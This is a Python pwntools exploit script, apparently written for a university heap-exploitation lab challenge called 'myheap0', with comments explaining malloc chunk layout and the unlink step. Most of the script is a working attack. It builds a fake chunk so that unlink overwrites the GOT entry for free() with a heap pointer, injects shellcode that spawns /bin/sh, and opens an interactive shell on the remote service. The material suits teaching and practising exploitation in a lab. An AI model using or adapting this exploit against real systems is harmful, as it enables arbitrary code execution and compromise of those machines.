#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template myheap0
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'myheap0')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('lettieri.iet.unipi.it', 4460)
    else:
        return remote('localhost', 4460)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RPATH:    b'.'

# --------
# to see if the heap is executable vmmap after a malloc
# --------

# how a chunk is made when it's in use

# +-----------------+
# |                 | <- start of c1 header (data of c0 if prev is 1)
# +-----------------+
# |   size | prev   | 
# +-----------------+
# |       data      | <- a
# +-----------------+
# |       data      | <- start of c2 header
# +-----------------+
# |   size | 00prev |
# +-----------------+
# |                 | <- b
# +-----------------+
# |                 | 
# +-----------------+

# on free chunks, the last 8 bytes is the size of the chunk

# +-----------------+
# |   size | prev   | 
# +-----------------+
# |    fd: 0x00     |
# +-----------------+ 
# |    bk: 0x00     |
# +-----------------+
# |      size       |   <- start of c2 header
# +-----------------+
# |    size | 0     |
# +-----------------+


# FREE:
# to free a chunk:
# - go back 8 bytes to see the size
# - write the size in the last byte
# - set the prev of the next chunk to 0 (fried)

# add the chunk to the fast bins (double linked list)
# - setting fd and bk
#
# in reality, at the start if prev in use is 0
# - check the size above (size of prev chunk)
# - subtract size and get prev-chunk start
# - remove it from it's fastbin
#   c->fd->bk = c->bk;
#   c->bk->fd = c->fd;
# - write the newsize in the header size*2 and also at the end 

io = start()

fake_size = 64

# avevo sminchiato faac e quindi falliva
# 0x79062706a82c    mov    qword ptr [rax + 0x18], rdx
# devo mettere AAAA in RAX e BBBB in RDX
# io.send(flat({
#     264 - size + 8: "AAAA",
#     264 - size + 16: "BBBB",

#     264-8: size,
#     264: p8(0)
# }))

x = io.recvline()

a_ptr = x.split(b" ")[1]
a_ptr = int(a_ptr, 16)

#  ► 0x79062706a82c    mov    qword ptr [rax + 0x18], rdx

io.send(flat({
    0 : asm("jmp $+32"),
    32: asm(shellcraft.amd64.linux.sh()),
    264 - fake_size + 8: exe.got['free'] - 3 * 8,
    264 - fake_size + 16: a_ptr,
    264-8: fake_size,

    # 0x00 wasn't working because it was destroying the size of b
    # size of b was (264+8) -> 0x110 | 1 (prev in use)
    # - so i had to make it  0x111 
    # - not 0x100
    # - in orther to prevent forward consolidation
    264: p8(0x10)
}))

io.interactive()

